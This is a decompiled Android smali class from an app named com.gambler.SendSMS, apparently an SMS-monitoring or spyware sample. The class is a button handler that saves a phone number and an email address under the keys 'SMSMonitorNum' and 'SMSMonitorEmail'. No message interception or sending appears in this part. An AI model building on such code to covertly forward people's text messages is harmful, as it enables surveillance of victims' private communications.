.class final Lcom/gambler/SendSMS/g;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/view/View$OnClickListener;


# instance fields
.field private synthetic a:Lcom/gambler/SendSMS/MainActivity;


# direct methods
.method constructor <init>(Lcom/gambler/SendSMS/MainActivity;)V
    .locals 0

    iput-object p1, p0, Lcom/gambler/SendSMS/g;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final onClick(Landroid/view/View;)V
    .locals 4

    iget-object v0, p0, Lcom/gambler/SendSMS/g;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-static {v0}, Lcom/gambler/SendSMS/MainActivity;->c(Lcom/gambler/SendSMS/MainActivity;)Z

    move-result v0

    if-nez v0, :cond_0

    iget-object v0, p0, Lcom/gambler/SendSMS/g;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-static {v0}, Lcom/gambler/SendSMS/MainActivity;->d(Lcom/gambler/SendSMS/MainActivity;)V

    :goto_0
    return-void

    :cond_0
    iget-object v0, p0, Lcom/gambler/SendSMS/g;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-static {v0}, Lcom/gambler/SendSMS/MainActivity;->a(Lcom/gambler/SendSMS/MainActivity;)Landroid/widget/EditText;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-interface {v0}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/gambler/SendSMS/g;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-static {v1}, Lcom/gambler/SendSMS/MainActivity;->e(Lcom/gambler/SendSMS/MainActivity;)Landroid/widget/EditText;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-interface {v1}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_1

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_1

    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    const-string v3, "@"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    const-string v2, "SMSMonitorEmail"

    invoke-static {v2, v1}, Lcom/gambler/SendSMS/d;->a(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_1
    const-string v1, "SMSMonitorNum"

    invoke-static {v1, v0}, Lcom/gambler/SendSMS/d;->a(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    iget-object v0, p0, Lcom/gambler/SendSMS/g;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-static {v0}, Lcom/gambler/SendSMS/MainActivity;->a(Lcom/gambler/SendSMS/MainActivity;)Landroid/widget/EditText;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/EditText;->requestFocus()Z

    iget-object v0, p0, Lcom/gambler/SendSMS/g;->a:Lcom/gambler/SendSMS/MainActivity;

    iget-object v1, p0, Lcom/gambler/SendSMS/g;->a:Lcom/gambler/SendSMS/MainActivity;

    const v2, 0x7f05000c

    invoke-virtual {v1, v2}, Lcom/gambler/SendSMS/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    goto :goto_0

    :cond_2
    iget-object v0, p0, Lcom/gambler/SendSMS/g;->a:Lcom/gambler/SendSMS/MainActivity;

    invoke-virtual {v0}, Lcom/gambler/SendSMS/MainActivity;->finish()V

    goto :goto_0
.end method
